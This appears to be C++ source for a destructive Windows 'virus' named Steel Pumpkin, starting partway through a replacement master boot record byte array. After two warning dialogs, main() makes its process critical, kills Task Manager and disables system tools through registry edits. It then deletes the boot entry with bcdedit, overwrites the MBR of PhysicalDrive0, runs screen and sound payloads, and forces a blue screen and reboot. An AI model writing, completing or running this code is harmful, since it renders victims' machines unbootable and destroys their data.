01,0x1E,0x00,0x7D,0x09,0x40,0x01,0x06,0xBF,0x76,0x40,0x8D,0x40,0x01,0x06,0x41,0x01,0x23,0x40,0x01,0x33,0x40,0x1F,0x40,0x4B,0x40,0x01,0x06,0xC0,0x12,0x40,0x98,0x40,0x01,0x05,0xCD,0x71,0x40,0x99,0x40,0x01,0x04,0x3F,0x01,0x05,0x40,0x01,0x05,0x44,0x2E,0x10,0x40,0x01,0x07,0x5A,0x05,0x3F,0x40,0x01,0x05,0xFF,0x22,0x08,0x40,0x01,0x18,0xF1,0x1A,0x17,0xC0,0x5D,0x07,0x41,0x01,0x40,0xA1,0x40,0x01,0x06,0x83,0x2F,0x40,0x54,0x40,0x01,0x0D,0x40,0x24,0x1A,0x31,0x1C,0x40,0x73,0x40,0x01,0x80,0x00,0x40,0x64,0x40,0x01,0x04,0x82,0x07,0x2C,0x40,0x01,0x0B,0x00,0x2D,0x05,0x40,0x01,0x0B,0x80,0x25,0x1C,0x70,0x1D,0x19,0x40,0x60,0x06,0x41,0x01,0x40,0x52,0x40,0x01,0x06,0x81,0x02,0x40,0x4C,0x40,0x01,0x08,0x00,0x14,0x40,0x42,0x40,0x01,0x0A,0x80,0x11,0x0D,0xC0,0x26,0x29,0xC0,0x5D,0x2C,0x40,0x01,0x04,0x20,0x00,0x38,0x00,0x37,0x25,0x40,0x01,0x07,0xBE,0x0D,0x16,0x40,0x01,0x05,0x3F,0x01,0x80,0x42,0x08,0x3F,0x01,0x10,0x40,0x01,0x04,0x3F,0x01,0x23,0x40,0x01,0x0D,0x40,0x10,0x0D,0x40,0x01,0x0B,0x3F,0x01,0x09,0x40,0x01,0x06,0x40,0x06,0x40,0xAD,0x40,0x01,0x19,0x00,0x19,0x06,0x3F,0x01,0x0C,0x00,0x6E,0x0C,0x40,0x01,0x05,0x3F,0x01,0x22,0x40,0x01,0x07,0x3F,0x01,0x12,0x40,0x01,0x08,0xFF,0x27,0x18,0x80,0x2F,0x26,0x00,0x64,0x40,0x9B,0x40,0x01,0x04,0x7C,0x00,0x40,0x41,0x40,0x01,0x08,0xFF,0x13,0x0B,0x00,0x50,0x0B,0xC0,0x2B,0x1C,0xC0,0x30,0x40,0x48,0x40,0x01,0x3A,0xC0,0x3A,0x40,0x47,0x40,0x01,0x0B,0x00,0x32,0x0B,0x40,0x01,0x82,0x00,0x00,0x00,0x07,0x80,0x2F,0x21,0x40,0x01,0x0E,0x40,0x51,0x0B,0xC0,0x2B,0x1D,0x00,0x32,0x29,0x40,0x01,0x80,0x00,0x40,0xDB,0x40,0x01,0x0F,0x00,0x19,0x09,0x40,0x01,0x20,0x40,0x29,0x29,0x40,0x01,0x05,0x81,0x02,0x40,0x95,0x40,0x01,0x04,0x42,0x00,0x10,0x40,0x6A,0x0A,0x40,0x01,0x04,0x0A,0x00,0x3A,0x40,0x01,0x21,0xC0,0x76,0x40,0xA8,0x40,0x01,0x09,0x7F,0x07,0x11,0x40,0x01,0x05,0x3F,0x01,0x10,0xC0,0x35,0x2F,0x40,0x01,0x08,0x01,0x1E,0x08,0x40,0x01,0x05,0xC3,0x58,0x08,0x3F,0x79,0x1D,0xC0,0x0D,0x07,0xC2,0x08,0x24,0x40,0x6A,0x04,0x2B,0x00,0x18,0x40,0x01,0x05,0x3F,0x01,0x3A,0xC0,0x3F,0x40,0x5A,0x40,0x01,0x05,0x3F,0x01,0x20,0x40,0x01,0x11,0x40,0x1F,0x0B,0x40,0x01,0x20,0x00,0x0F,0x2A,0x40,0x01,0x04,0x41,0x01,0x40,0x52,0x40,0x01,0x05,0x3F,0x29,0x3B,0x40,0x01,0x06,0x3F,0x01,0x13,0x40,0x1F,0x29,0x40,0x01,0x13,0x80,0x20,0x05,0x42,0x5B,0x07,0x7E,0x02,0x39,0x40,0x01,0x11,0x80,0x70,0x07,0x81,0x02,0x17,0x80,0x3E,0x40,0x95,0x40,0x01,0x05,0x1B,0x01,0x1C,0x40,0x01,0x08,0x46,0x0C,0x0E,0x00,0x23,0x05,0x40,0x01,0x05,0x18,0x00,0x3E,0x40,0x01,0x0E,0x40,0x1A,0x1D,0x40,0x01,0x39,0x00,0x32,0x08,0xC1,0x03,0x36,0x40,0x01,0x07,0x3F,0x01,0x0D,0x00,0x19,0x0F,0x40,0x01,0x09,0x40,0x38,0x13,0xC0,0x21,0x09,0x3F,0x01,0x17,0x40,0x01,0x22,0xC0,0x12,0x40,0xBE,0x40,0x01,0x82,0x00,0x00,0x00,0x10,0x00,0x19,0x0C,0x40,0x01,0x07,0x3F,0x01,0x11,0x40,0x01,0x0D,0xC1,0x0E,0x12,0x00,0x28,0x04,0x3F,0x01,0x0B,0x40,0x5B,0x36,0x40,0x01,0x13,0x40,0x79,0x05,0x54,0x00,0x13,0x40,0x01,0x07,0x3F,0x01,0x40,0x72,0x40,0x01,0x04,0x16,0x00,0x10,0xC0,0x17,0x23,0x40,0x01,0x0C,0x41,0x3D,0x14,0x40,0x29,0x0E,0x80,0x3E,0x40,0x4A,0x40,0x01,0x06,0x41,0x01,0x40,0x8A,0x40,0x01,0x05,0x3B,0x00,0x40,0x5A,0x40,0x01,0x25,0x00,0x23,0x2D,0x40,0x01,0x80,0x0D,0x40,0x79,0x40,0x01,0x15,0x80,0x11,0x05,0x3F,0x01,0x0F,0xC0,0x17,0x10,0x40,0x01,0x0B,0x40,0x3D,0x0E,0x40,0x01,0x07,0xC0,0x26,0x13,0x40,0x01,0x0A,0x7F,0x02,0x40,0x51,0x40,0x01,0x04,0x41,0x01,0x40,0x76,0x40,0x01,0x05,0x7F,0x20,0x0D,0x80,0x20,0x06,0xE5,0x00,0x1C,0x40,0x01,0x04,0x06,0x00,0x14,0x40,0x01,0x05,0x41,0x01,0x1D,0x40,0x01,0x11,0x40,0x15,0x40,0x4B,0x40,0x01,0x04,0x41,0x01,0x0D,0x40,0x01,0x07,0xBE,0x08,0x38,0x80,0x39,0x27,0x40,0x01,0x06,0xC1,0x21,0x82,0x00,0x00,0x00,0x06,0x3F,0x01,0x08,0x3E,0x01,0x1B,0x40,0x01,0x04,0x3E,0x01,0x0C,0xC0,0x3F,0x0E,0x80,0x07,0x19,0x40,0x42,0x07,0x40,0x65,0x40,0x53,0x40,0x06,0x05,0xC0,0x0D,0x05,0x41,0x01,0x40,0x7C,0x40,0x01,0x0B,0xBE,0x04,0x0C,0x80,0x16,0x34,0x40,0x01,0x15,0x80,0x2F,0x07,0x7F,0x66,0x04,0x41,0x01,0x40,0x57,0x40,0x01,0x80,0x00,0x0D,0x40,0x01,0x05,0x01,0x46,0x40,0x64,0x40,0x01,0x10,0x42,0x01,0x14,0x80,0x1B,0x0B,0x40,0x01,0x06,0x3F,0x01,0x07,0x40,0x01,0x12,0x40,0x1A,0x40,0x78,0x40,0x01,0x05,0x81,0x02,0x40,0x77,0x40,0x01,0x0D,0x43,0x01,0x15,0xC0,0x1C,0x08,0x40,0x2E,0x40,0x43,0x40,0x01,0x07,0xFE,0x0E,0x40,0x54,0x40,0x01,0x80,0x00,0x0F,0x00,0x4B,0x3D,0x80,0x3E,0x2E,0x40,0x01,0x80,0x02,0x07,0xFA,0x04,0x10,0x00,0x19,0x40,0x49,0x40,0x01,0x08,0x3F,0x6A,0x3F,0x00,0x0F,0x08,0x33,0x1F,0x40,0x92,0x40,0x01,0x1B,0x40,0x1A,0x0C,0xC0,0x30,0x04,0x81,0x07,0x1F,0x40,0x01,0x15,0x80,0x34,0x0A,0x40,0x01,0x3D,0x80,0x11,0x1A,0x40,0x01,0x80,0x28,0x05,0xDB,0x01,0x08,0x40,0x01,0x06,0x3F,0x01,0x40,0x93,0x40,0x01,0x0E,0xC0,0x30,0x39,0x40,0x01,0x1F,0x00,0x14,0x34,0x40,0x01,0x07,0x41,0x01,0x40,0xD6,0x40,0x01,0x09,0xFF,0x6D,0x09,0x00,0x7D,0x40,0x52,0x40,0x01,0x05,0x41,0x01,0x40,0xBF,0x40,0x01,0x07,0x3F,0x01,0x15,0x40,0x01,0x0E,0x00,0x7D,0x41,0x2D,0x40,0x01,0x06,0xC3,0x71,0x0E,0x80,0x43,0x40,0x60,0x40,0x01,0x3F,0x00,0x46,0x40,0x42,0x40,0x01,0x08,0x00,0x1E,0x40,0x47,0x40,0x01,0x2D,0x80,0x43,0x35,0x40,0x01,0x04,0x41,0x01,0x40,0xAE,0x40,0x01,0x11,0x40,0x2E,0x28,0x40,0x01,0x23,0x00,0x7D,0x33,0x40,0x01,0x83,0x2A,0x00,0x00,0x00,0x05,0x40,0x01,0x07,0xBF,0x03,0x40,0xA2,0x40,0x01,0x10,0xC0,0x30,0x16,0x40,0x01,0x07,0x81,0x75,0x2B,0x00,0x7D,0x40,0x42,0x40,0x01,0x40,0x40,0xC0,0x49,0x40,0x75,0x40,0x01,0x04,0x81,0x11,0x26,0x40,0x01,0x06,0x41,0x01,0x40,0x50,0x40,0x01,0x08,0x41,0x01,0x41,0x3F,0x40,0x01,0x40,0x85,0x00,0x55,0x09,0x40,0x24,0x40,0x45,0x40,0x01,0x2F,0x80,0x5C,0x0A,0x40,0x01 };
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);
BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}
BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI KillMBR(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 3584, &dwBytesWritten, 0);
	return 1;
}
void reg_addition(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value)//credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition
	);
	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);
	RegCloseKey(hKey);
	return;
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	if (MessageBoxA(NULL, "Warning! This program is a computer virus that known as 'Steel Pumpkin'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.", "Steel Pumpkin.exe--First warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
	{
		UnhookWindowsHookEx(hMsgHookA);
		ExitProcess(0);
	}
	else
	{
		CREATE_NO_WINDOW;
		HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus(LambdaTechnology) isn't responsible!!!", L"Steel Pumpkin.exe--LAST WARNING", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			UnhookWindowsHookEx(hMsgHookA);
			ExitProcess(0);
		}
		else
		{
			
			ProcessIsCritical();
			system("taskkill /f /im taskmgr.exe");
			system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
			system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
			system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
			system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
			system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
			system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
			system("bcdedit /delete {current}");
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 1);
			CreateThread(0, 0, KillMBR, 0, 0, 0);
			Sleep(5000);
			HANDLE thread1_num1 = CreateThread(0, 0, Payload1_num1, 0, 0, 0);
			HANDLE thread1_num2 = CreateThread(0, 0, Payload1_num2, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1_num1, 0);
			CloseHandle(thread1_num1);
			TerminateThread(thread1_num2, 0);
			CloseHandle(thread1_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread2_num1 = CreateThread(0, 0, Payload2_num1, 0, 0, 0);
			HANDLE thread2_num2 = CreateThread(0, 0, Payload2_num2, 0, 0, 0);
			HANDLE thread2_num3 = CreateThread(0, 0, Payload2_num3, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2_num1, 0);
			CloseHandle(thread2_num1);
			TerminateThread(thread2_num2, 0);
			CloseHandle(thread2_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread3 = CreateThread(0, 0, Payload3_num1, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread4_num1 = CreateThread(0, 0, Payload4_num1, 0, 0, 0);
			HANDLE thread4_num2 = CreateThread(0, 0, Payload4_num2, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4_num1, 0);
			CloseHandle(thread4_num1);
			TerminateThread(thread4_num2, 0);
			CloseHandle(thread4_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread5 = CreateThread(0, 0, Payload5_num1, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread6 = CreateThread(0, 0, Payload6_num1, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread7_num1 = CreateThread(0, 0, Payload7_num1, 0, 0, 0);
			HANDLE thread7_num2 = CreateThread(0, 0, Payload7_num2, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7_num1, 0);
			CloseHandle(thread7_num1);
			TerminateThread(thread7_num2, 0);
			CloseHandle(thread7_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread8 = CreateThread(0, 0, Payload8_num1, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread9 = CreateThread(0, 0, Payload9_num1, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread10_num1 = CreateThread(0, 0, Payload10_num1, 0, 0, 0);
			HANDLE thread10_num2 = CreateThread(0, 0, Payload10_num2, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10_num1, 0);
			CloseHandle(thread10_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread11_num1 = CreateThread(0, 0, Payload11_num1, 0, 0, 0);
			HANDLE thread11_num2 = CreateThread(0, 0, Payload11_num2, 0, 0, 0);
			bytebeat11();
			TerminateThread(thread11_num1, 0);
			CloseHandle(thread11_num1);
			TerminateThread(thread11_num2, 0);
			CloseHandle(thread11_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread12 = CreateThread(0, 0, Payload12_num1, 0, 0, 0);
			bytebeat12();
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			TerminateThread(thread2_num3, 0);
			CloseHandle(thread2_num3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread13_num1 = CreateThread(0, 0, Payload13_num1, 0, 0, 0);
			HANDLE thread13_num2 = CreateThread(0, 0, Payload13_num2, 0, 0, 0);
			bytebeat13();
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread14 = CreateThread(0, 0, Payload14_num1, 0, 0, 0);
			bytebeat14();
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread15 = CreateThread(0, 0, Payload15_num1, 0, 0, 0);
			bytebeat15();
			TerminateThread(thread10_num2, 0);
			CloseHandle(thread10_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread16 = CreateThread(0, 0, Payload16_num1, 0, 0, 0);
			bytebeat16();
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread17 = CreateThread(0, 0, Payload17_num1, 0, 0, 0);
			bytebeat17();
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			HANDLE thread18 = CreateThread(0, 0, Payload18_num1, 0, 0, 0);
			bytebeat18();
			TerminateThread(thread13_num1, 0);
			CloseHandle(thread13_num1);
			TerminateThread(thread13_num2, 0);
			CloseHandle(thread13_num2);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			TerminateThread(thread17, 0);
			CloseHandle(thread17);
			TerminateThread(thread18, 0);
			CloseHandle(thread18);
			InvalidateRect(0, 0, 0);
			refreshscr();
			Sleep(100);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC0005033, 0, 0, 0, 6, &response);
			// If the computer is still running, do it the normal way
			HANDLE token;
			TOKEN_PRIVILEGES privileges;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			Sleep(-1);
		}
	}
	return 0;
}